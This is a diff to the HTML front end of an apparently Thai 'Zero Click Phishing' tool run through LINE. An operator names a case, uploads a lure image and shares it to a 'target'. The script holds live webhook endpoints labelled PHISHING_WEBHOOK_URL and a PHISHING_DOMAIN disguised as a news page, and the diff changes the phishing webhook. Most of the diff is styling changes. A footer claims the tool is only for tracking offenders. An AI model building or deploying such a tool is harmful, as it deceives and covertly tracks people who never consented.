@@ -4,569 +4,302 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Zero Click Phishing</title>
-    <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;700&display=swap" rel="stylesheet">
     <!-- Line LIFF SDK -->
     <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
     <style>
-        :root {
-            --primary-color: #00B900;
-            --primary-dark: #007700;
-            --primary-light: #4CD964;
-            --accent-color: #FF6B6B;
-            --background-light: #f8f9fa;
-            --background-white: #ffffff;
-            --text-primary: #333333;
-            --text-secondary: #6c757d;
-            --text-light: #8e9093;
-            --border-color: #e0e0e0;
-            --shadow-sm: 0 2px 4px rgba(0,0,0,0.05);
-            --shadow-md: 0 4px 6px rgba(0,0,0,0.08);
-            --shadow-lg: 0 10px 15px rgba(0,0,0,0.1);
-            --radius-sm: 6px;
-            --radius-md: 12px;
-            --radius-lg: 16px;
-            --transition-fast: 0.2s ease;
-            --transition-normal: 0.3s ease;
-            --spacing-xs: 4px;
-            --spacing-sm: 8px;
-            --spacing-md: 16px;
-            --spacing-lg: 24px;
-            --spacing-xl: 32px;
-        }
-        
         * {
             box-sizing: border-box;
             font-family: 'Prompt', sans-serif;
         }
-        
         body {
             margin: 0;
-            padding: 0;
-            background-color: var(--background-light);
-            color: var(--text-primary);
-            line-height: 1.6;
+            padding: 16px;
+            background-color: #f5f5f5;
+            color: #333;
         }
-        
-        .page-wrapper {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            padding: var(--spacing-md);
-        }
-        
         .container {
-            max-width: 550px;
-            width: 100%;
+            max-width: 500px;
             margin: 0 auto;
-            background-color: var(--background-white);
-            border-radius: var(--radius-lg);
-            box-shadow: var(--shadow-lg);
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             overflow: hidden;
-            position: relative;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
         }
-        
         .header {
-            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+            background: linear-gradient(135deg, #00B900, #007700);
             color: white;
-            padding: var(--spacing-lg) var(--spacing-md);
+            padding: 20px;
             text-align: center;
             position: relative;
-            display: flex; 
-            align-items: center;
-            justify-content: center;
-            gap: var(--spacing-md);
+            display: flex; /* Added */
+            align-items: center; /* Added */
+            justify-content: center; /* Added */
+            gap: 10px; /* Added space between icon and text */
         }
-        
-        .header .header-icon {
-            width: 32px;
-            height: 32px;
-            fill: white;
-            filter: drop-shadow(0 2px 3px rgba(0,0,0,0.2));
-            transition: transform var(--transition-normal);
+        .header .header-icon { /* Added */
+            width: 28px;
+            height: 28px;
+            fill: white; /* Color the SVG icon white */
         }
-        
-        .header:hover .header-icon {
-            transform: scale(1.1);
+        .header .header-text { /* Added */
+             text-align: left;
         }
-        
-        .header .header-text {
-            text-align: left;
-        }
-        
         .header h1 {
             margin: 0;
-            font-size: 22px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-            text-shadow: 0 2px 3px rgba(0,0,0,0.1);
+            font-size: 20px;
+            font-weight: 700; /* Slightly bolder */
         }
-        
         .header .subtitle {
-            font-size: 14px;
+            font-size: 13px; /* Slightly smaller */
             opacity: 0.9;
-            margin-top: var(--spacing-xs);
-            font-weight: 300;
+            margin-top: 5px;
         }
-        
         .content {
-            padding: var(--spacing-xl);
-            flex: 1;
+            padding: 20px;
         }
-        
         .form-group {
-            margin-bottom: var(--spacing-xl);
+            margin-bottom: 20px;
         }
-        
-        .form-group:last-child {
-            margin-bottom: 0;
-        }
-        
         label {
             display: block;
-            margin-bottom: var(--spacing-sm);
+            margin-bottom: 8px;
             font-weight: 500;
-            color: var(--text-primary);
-            font-size: 15px;
+            color: #555;
         }
-        
         input[type="text"] {
             width: 100%;
-            padding: 14px 16px;
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-sm);
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
             font-size: 16px;
-            transition: all var(--transition-normal);
-            background-color: var(--background-white);
+            transition: border-color 0.3s;
         }
-        
         input[type="text"]:focus {
-            border-color: var(--primary-color);
+            border-color: #00B900;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(0, 185, 0, 0.15);
         }
-        
         .image-preview-container {
-            margin-top: var(--spacing-md);
+            margin-top: 10px;
             text-align: center;
-            border: 2px dashed var(--border-color);
-            padding: var(--spacing-xl);
-            border-radius: var(--radius-md);
-            background-color: var(--background-light);
-            transition: all var(--transition-normal);
-            cursor: pointer;
-            min-height: 160px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
+            border: 2px dashed #ddd;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: #fafafa;
+            transition: all 0.3s ease;
         }
-        
         .image-preview-container:hover {
-            border-color: var(--primary-color);
-            background-color: rgba(0, 185, 0, 0.05);
+            border-color: #00B900;
+            background-color: #f0f8f0;
         }
-        
         .image-preview {
             max-width: 100%;
-            max-height: 240px;
+            max-height: 200px;
             display: none;
-            margin: var(--spacing-md) auto 0;
-            border-radius: var(--radius-sm);
-            box-shadow: var(--shadow-sm);
-            transition: all var(--transition-normal);
+            margin-top: 10px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
-        
-        .uploadPrompt {
-            color: var(--text-secondary);
-            font-size: 14px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: var(--spacing-md);
-        }
-        
-        .upload-icon {
-            width: 42px;
-            height: 42px;
-            fill: var(--text-light);
-            margin-bottom: var(--spacing-xs);
-        }
-        
         .btn {
             display: inline-block;
-            background-color: var(--primary-color);
+            background-color: #00B900;
             color: white;
             border: none;
-            padding: 14px 24px;
+            padding: 12px 24px;
             font-size: 16px;
-            border-radius: var(--radius-sm);
+            border-radius: 8px;
             cursor: pointer;
-            transition: all var(--transition-normal);
+            transition: background-color 0.3s;
             text-align: center;
             width: 100%;
             font-weight: 500;
-            box-shadow: var(--shadow-sm);
-            position: relative;
-            overflow: hidden;
         }
-        
-        .btn::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(255, 255, 255, 0.1);
-            transform: scale(0);
-            border-radius: 50%;
-            transition: transform 0.5s ease;
-        }
-        
         .btn:hover {
-            background-color: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: var(--shadow-md);
+            background-color: #009900;
         }
-        
-        .btn:active::after {
-            transform: scale(2);
-            opacity: 0;
-            transition: 0s;
-        }
-        
         .btn:disabled {
-            background-color: var(--text-light);
+            background-color: #cccccc;
             cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
         }
-        
         .btn-file {
-            background-color: var(--text-secondary);
-            margin-bottom: var(--spacing-md);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: var(--spacing-sm);
+            background-color: #666;
+            margin-bottom: 15px;
         }
-        
         .btn-file:hover {
             background-color: #555;
         }
-        
         .btn-share {
-            margin-top: var(--spacing-lg);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: var(--spacing-sm);
+            margin-top: 20px;
         }
-        
-        .btn-share .share-icon {
-            width: 18px;
-            height: 18px;
-            fill: white;
-        }
-        
         .status {
-            margin-top: var(--spacing-lg);
-            padding: var(--spacing-md);
-            border-radius: var(--radius-sm);
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 6px;
             text-align: center;
             display: none;
-            font-weight: 500;
-            transform: translateY(10px);
-            opacity: 0;
-            transition: all var(--transition-normal);
         }
-        
-        .status.active {
-            transform: translateY(0);
-            opacity: 1;
-        }
-        
         .status.success {
-            background-color: rgba(46, 213, 115, 0.15);
-            color: #2ed573;
-            border: 1px solid rgba(46, 213, 115, 0.3);
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
         }
-        
         .status.error {
-            background-color: rgba(255, 107, 107, 0.15);
-            color: #ff6b6b;
-            border: 1px solid rgba(255, 107, 107, 0.3);
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
         }
-        
         .input-group {
             display: flex;
-            margin-bottom: var(--spacing-md);
+            margin-bottom: 10px;
         }
-        
         .input-group input {
             flex: 1;
             border-top-right-radius: 0;
             border-bottom-right-radius: 0;
         }
-        
         .input-group button {
             border-top-left-radius: 0;
             border-bottom-left-radius: 0;
-            padding: 0 var(--spacing-md);
-            background-color: var(--primary-color);
+            padding: 0 15px;
+            background-color: #00B900;
             color: white;
             border: none;
             cursor: pointer;
-            min-width: 48px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
-        
         .input-group button:hover {
-            background-color: var(--primary-dark);
+            background-color: #009900;
         }
-        
         .input-group button:disabled {
-            background-color: var(--text-light);
+            background-color: #cccccc;
             cursor: not-allowed;
         }
-        
         .footer {
             text-align: center;
-            padding: var(--spacing-lg);
+            padding: 15px;
             font-size: 12px;
-            color: var(--text-secondary);
-            border-top: 1px solid var(--border-color);
-            background-color: rgba(0, 0, 0, 0.01);
+            color: #888;
+            border-top: 1px solid #eee;
         }
-        
         .loader {
             display: none;
             text-align: center;
-            margin: var(--spacing-lg) 0;
+            margin: 20px 0;
         }
-        
         .loader-spinner {
             width: 40px;
             height: 40px;
             margin: 0 auto;
-            border: 4px solid rgba(0, 185, 0, 0.1);
-            border-top: 4px solid var(--primary-color);
+            border: 4px solid rgba(0, 185, 0, 0.2);
+            border-top: 4px solid #00B900;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
-        
-        .loader p {
-            margin-top: var(--spacing-md);
-            color: var(--text-secondary);
-            font-size: 14px;
-        }
-        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
         .tips {
-            background-color: rgba(41, 128, 185, 0.1);
-            border-left: 4px solid #2980b9;
-            padding: var(--spacing-md);
-            margin: var(--spacing-lg) 0 0;
+            background-color: #e9f7fe;
+            border-left: 4px solid #4fc3f7;
+            padding: 10px 15px;
+            margin: 20px 0;
             font-size: 14px;
-            border-radius: var(--radius-sm);
-            display: flex;
-            align-items: flex-start;
-            gap: var(--spacing-sm);
+            border-radius: 4px;
         }
-        
-        .tips .tip-icon {
-            color: #2980b9;
-            font-size: 18px;
-            margin-top: 2px;
-            flex-shrink: 0;
-        }
-        
         .tips p {
             margin: 0;
-            color: #2573a7;
+            color: #0277bd;
         }
-        
         .user-info {
-            background-color: var(--background-white);
-            padding: var(--spacing-md);
-            border-radius: var(--radius-md);
-            margin-bottom: var(--spacing-lg);
-            border: 1px solid var(--border-color);
-            box-shadow: var(--shadow-sm);
-            animation: fadeIn 0.5s ease;
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #eee;
         }
-        
         .user-info .profile {
             display: flex;
             align-items: center;
+            margin-bottom: 10px;
         }
-        
         .user-info .profile-img {
-            width: 54px;
-            height: 54px;
+            width: 50px;
+            height: 50px;
             border-radius: 50%;
             object-fit: cover;
-            margin-right: var(--spacing-md);
-            border: 2px solid var(--primary-color);
-            box-shadow: var(--shadow-sm);
-            transition: transform var(--transition-normal);
+            margin-right: 15px;
+            border: 2px solid #00B900;
         }
-        
-        .user-info:hover .profile-img {
-            transform: scale(1.05);
-        }
-        
         .user-info .user-name {
-            font-weight: 600;
-            color: var(--text-primary);
-            font-size: 17px;
-            margin-bottom: 4px;
+            font-weight: 500;
+            color: #333;
+            font-size: 16px;
         }
-        
         .user-info .user-status {
             font-size: 14px;
-            color: var(--primary-color);
+            color: #00B900;
             font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
         }
-        
         .message-box {
-            background-color: rgba(255, 193, 7, 0.1);
+            background-color: #fff9e6;
             border-left: 4px solid #ffc107;
-            padding: var(--spacing-md);
-            margin: var(--spacing-lg) 0;
-            border-radius: var(--radius-sm);
-            animation: fadeIn 0.5s ease;
+            padding: 10px 15px;
+            margin: 20px 0;
+            border-radius: 4px;
         }
-        
         .message-box p {
             margin: 0;
-            color: #946c00;
+            color: #856404;
             line-height: 1.5;
-            font-size: 14px;
         }
-        
         .message-box.error {
-            background-color: rgba(220, 53, 69, 0.1);
+            background-color: #f8d7da;
             border-left: 4px solid #dc3545;
         }
-        
         .message-box.error p {
-            color: #dc3545;
+            color: #721c24;
         }
-        
         .badge {
             display: inline-block;
-            padding: 4px 10px;
+            padding: 4px 8px;
             border-radius: 12px;
             font-size: 12px;
             font-weight: 500;
-            margin-left: var(--spacing-xs);
+            margin-left: 8px;
         }
-        
         .badge.approved {
-            background-color: rgba(46, 213, 115, 0.15);
-            color: #2ed573;
+            background-color: #d4edda;
+            color: #155724;
         }
-        
         .badge.pending {
-            background-color: rgba(255, 193, 7, 0.15);
-            color: #ffc107;
+            background-color: #fff3cd;
+            color: #856404;
         }
-        
         #loadingScreen {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background-color: rgba(255, 255, 255, 0.95);
+            background-color: rgba(255, 255, 255, 0.9);
             display: flex;
             justify-content: center;
             align-items: center;
             flex-direction: column;
             z-index: 1000;
-            transition: opacity 0.5s ease, visibility 0.5s ease;
         }
-        
         #loadingScreen .spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(0, 185, 0, 0.1);
-            border-top: 4px solid var(--primary-color);
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(0, 185, 0, 0.2);
+            border-top: 4px solid #00B900;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: var(--spacing-lg);
+            margin-bottom: 20px;
         }
-        
         #loadingScreen p {
-            color: var(--primary-color);
+            color: #00B900;
             font-weight: 500;
-            font-size: 16px;
-            animation: pulse 1.5s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 0.6; }
-            50% { opacity: 1; }
-            100% { opacity: 0.6; }
-        }
-        
-        /* Responsive adjustments */
-        @media (max-width: 480px) {
-            .page-wrapper {
-                padding: var(--spacing-xs);
-            }
-            
-            .content {
-                padding: var(--spacing-lg);
-            }
-            
-            .header {
-                padding: var(--spacing-md);
-            }
-            
-            .header h1 {
-                font-size: 18px;
-            }
-            
-            .header .subtitle {
-                font-size: 12px;
-            }
-            
-            .btn {
-                padding: 12px 20px;
-                font-size: 15px;
-            }
-            
-            .user-info .profile-img {
-                width: 46px;
-                height: 46px;
-            }
-            
-            .user-info .user-name {
-                font-size: 16px;
-            }
-            
-            .image-preview-container {
-                padding: var(--spacing-md);
-            }
         }
     </style>
 </head>
@@ -577,91 +310,75 @@
         <p>กำลังตรวจสอบระบบ...</p>
     </div>
 
-    <div class="page-wrapper">
-        <div class="container">
-            <div class="header">
-                <!-- Eye Icon SVG -->
-                <svg class="header-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
-                    <path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"/>
-                </svg>
-                <div class="header-text">
-                    <h1>Zero Click Phishing</h1>
-                    <div class="subtitle">สร้างรูปภาพส่งไปยังเป้าหมาย</div>
-                </div>
-            </div>
-            
-            <div class="content">
-                <!-- ส่วนแสดงข้อมูลผู้ใช้ -->
-                <div class="user-info" id="userInfoSection" style="display: none;">
-                    <div class="profile">
-                        <img id="profileImage" src="" alt="Profile" class="profile-img">
-                        <div>
-                            <div class="user-name" id="userName">User Name</div>
-                            <div class="user-status">
-                                <span id="userStatus">ตรวจสอบสิทธิ์...</span>
-                                <span id="statusBadge" class="badge">รอตรวจสอบ</span>
-                            </div>
+    <div class="container">
+        <div class="header">
+             <!-- Added Eye Icon SVG -->
+             <svg class="header-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
+                 <path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"/>
+             </svg>
+             <div class="header-text">
+                 <h1>Zero Click Phishing</h1>
+                 <div class="subtitle">สร้างรูปภาพส่งไปยังเป้าหมาย</div>
+             </div>
+        </div>
+        
+        <div class="content">
+            <!-- ส่วนแสดงข้อมูลผู้ใช้ -->
+            <div class="user-info" id="userInfoSection" style="display: none;">
+                <div class="profile">
+                    <img id="profileImage" src="" alt="Profile" class="profile-img">
+                    <div>
+                        <div class="user-name" id="userName">User Name</div>
+                        <div class="user-status">
+                            สถานะ: <span id="userStatus">ตรวจสอบสิทธิ์...</span>
+                            <span id="statusBadge" class="badge">รอตรวจสอบ</span>
                         </div>
-                    </div>
-                </div>
-                
-                <!-- ข้อความแนะนำหรือแจ้งเตือน -->
-                <div id="permissionMessage" class="message-box" style="display: none;">
-                    <p>กรุณารอการอนุมัติจากผู้ดูแลระบบก่อนใช้งาน หากคุณยังไม่ได้ลงทะเบียน สามารถพิมพ์คำสั่ง <strong>#regis</strong> ในแชทส่วนตัวกับบอท</p>
-                </div>
-                
-                <!-- ฟอร์มหลัก -->
-                <div id="mainForm">
-                    <div class="form-group">
-                        <label for="caseName">ชื่อเคส</label>
-                        <input type="text" id="caseName" placeholder="ระบุชื่อเคส" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="imageUpload">รูปภาพที่ส่งไปยังเป้าหมาย</label>
-                        <button class="btn btn-file" id="selectImageBtn">
-                            <svg class="share-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
-                                <path fill="currentColor" d="M296 384h-80c-13.3 0-24-10.7-24-24V192h-87.7c-17.8 0-26.7-21.5-14.1-34.1L242.3 5.7c7.5-7.5 19.8-7.5 27.3 0l152.2 152.2c12.6 12.6 3.7 34.1-14.1 34.1H320v168c0 13.3-10.7 24-24 24zm216-8v112c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V376c0-13.3 10.7-24 24-24h136v8c0 30.9 25.1 56 56 56h80c30.9 0 56-25.1 56-56v-8h136c13.3 0 24 10.7 24 24zm-124 88c0-11-9-20-20-20s-20 9-20 20 9 20 20 20 20-9 20-20zm64 0c0-11-9-20-20-20s-20 9-20 20 9 20 20 20 20-9 20-20z"/>
-                            </svg>
-                            เลือกรูปภาพ
-                        </button>
-                        <input type="file" id="imageUpload" accept="image/*" style="display: none;">
-                        <div class="image-preview-container">
-                            <img id="imagePreview" class="image-preview">
-                            <div id="uploadPrompt" class="uploadPrompt">
-                                <svg class="upload-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
-                                    <path fill="currentColor" d="M537.6 226.6c4.1-10.7 6.4-22.4 6.4-34.6 0-53-43-96-96-96-19.7 0-38.1 6-53.3 16.2C367 64.2 315.3 32 256 32c-88.4 0-160 71.6-160 160 0 2.7.1 5.4.2 8.1C40.2 219.8 0 273.2 0 336c0 79.5 64.5 144 144 144h368c70.7 0 128-57.3 128-128 0-61.9-44-113.6-102.4-125.4zM393.4 288H328v112c0 8.8-7.2 16-16 16h-48c-8.8 0-16-7.2-16-16V288h-65.4c-14.3 0-21.4-17.2-11.3-27.3l105.4-105.4c6.2-6.2 16.4-6.2 22.6 0l105.4 105.4c10.1 10.1 2.9 27.3-11.3 27.3z"/>
-                                </svg>
-                                คลิกหรือลากรูปภาพมาที่นี่
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="loader">
-                        <div class="loader-spinner"></div>
-                        <p>กำลังอัพโหลดรูปภาพ...</p>
-                    </div>
-                    
-                    <div id="statusMessage" class="status"></div>
-                    
-                    <button class="btn btn-share" id="shareBtn" disabled>
-                        <svg class="share-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
-                            <path fill="currentColor" d="M503.691 189.836L327.687 37.851C312.281 24.546 288 35.347 288 56.015v80.053C127.371 137.907 0 170.1 0 322.326c0 61.441 39.581 122.309 83.333 154.132 13.653 9.931 33.111-2.533 28.077-18.631C66.066 312.814 132.917 274.316 288 272.085V360c0 20.7 24.3 31.453 39.687 18.164l176.004-152c11.071-9.562 11.086-26.753 0-36.328z"/>
-                        </svg>
-                        แชร์ภาพไปยังเป้าหมาย
-                    </button>
-                    
-                    <div class="tips">
-                        <span class="tip-icon">💡</span>
-                        <p><strong>คำแนะนำ:</strong> รูปภาพควรมีขนาดเหมาะสม เพื่อการโหลดที่รวดเร็ว และดึงดูดความสนใจของเป้าหมาย</p>
                     </div>
                 </div>
             </div>
             
-            <div class="footer">
-                <p style="color: #d63031; font-weight: 600; margin-bottom: 10px;">⚠️ใช้เพื่อสืบสวนติดตามตัวผู้กระทำความผิดเพื่อมาดำเนินคดีตามกฎหมาย เท่านั่น!!!!</p>
-                &copy; 2025 Zero Click Phishing - Detective-X
+            <!-- ข้อความแนะนำหรือแจ้งเตือน -->
+            <div id="permissionMessage" class="message-box" style="display: none;">
+                <p>กรุณารอการอนุมัติจากผู้ดูแลระบบก่อนใช้งาน หากคุณยังไม่ได้ลงทะเบียน สามารถพิมพ์คำสั่ง <strong>#regis</strong> ในแชทส่วนตัวกับบอท</p>
             </div>
+            
+            <!-- ฟอร์มหลัก -->
+            <div id="mainForm">
+                <div class="form-group">
+                    <label for="caseName">ชื่อเคส</label>
+                    <!-- Removed the input-group and button -->
+                    <input type="text" id="caseName" placeholder="ระบุชื่อเคส" required>
+                    <!-- <button id="generateTrackingBtn" title="สร้าง Tracking Key อัตโนมัติ">⚡</button> -->
+                </div>
+                
+                <div class="form-group">
+                    <label for="imageUpload">รูปภาพที่ส่งไปยังเป้าหมาย</label>
+                    <button class="btn btn-file" id="selectImageBtn">เลือกรูปภาพ</button>
+                    <input type="file" id="imageUpload" accept="image/*" style="display: none;">
+                    <div class="image-preview-container">
+                        <img id="imagePreview" class="image-preview">
+                        <div id="uploadPrompt">คลิกเพื่อเลือกหรือลากรูปภาพมาที่นี่</div>
+                    </div>
+                </div>
+                
+                <div class="loader">
+                    <div class="loader-spinner"></div>
+                    <p>กำลังอัพโหลดรูปภาพ...</p>
+                </div>
+                
+                <div id="statusMessage" class="status"></div>
+                
+                <button class="btn btn-share" id="shareBtn" disabled>แชร์ภาพไปยังเป้าหมาย</button>
+                
+                <div class="tips">
+                    <p><strong>คำแนะนำ:</strong> รูปภาพควรมีขนาดเหมาะสม เพื่อการโหลดที่รวดเร็ว</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p style="color: red; font-weight: bold; margin-bottom: 10px;">⚠️ใช้เพื่อสืบสวนติดตามตัวผู้กระทำความผิดเพื่อมาดำเนินคดีตามกฎหมาย เท่านั่น!!!!</p>
+            &copy; 2025 Zero Click Phishing - Detective-X
         </div>
     </div>
 
@@ -682,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbydb_rmDIEm7Q1KkFU_hpGELvSNRdlR880GK2CxItehtxx_OOPjyIgdvJEKjs5IXfpLyA/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxtTmBrGRm3MkWUe8OMsDzTd5EZtAYl3ieg0bLwIH52C4_BQfbuDxaW281_kUd9SQTwpQ/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -1216,17 +933,9 @@
                 statusEl.className = 'status error';
             }
             
-            // เพิ่ม class active สำหรับทำอนิเมชัน
-            setTimeout(() => {
-                statusEl.classList.add('active');
-            }, 10);
-            
             // ซ่อนสถานะหลังจาก 5 วินาที
             setTimeout(() => {
-                statusEl.classList.remove('active');
-                setTimeout(() => {
-                    statusEl.style.display = 'none';
-                }, 300);
+                statusEl.style.display = 'none';
             }, 5000);
         }
         
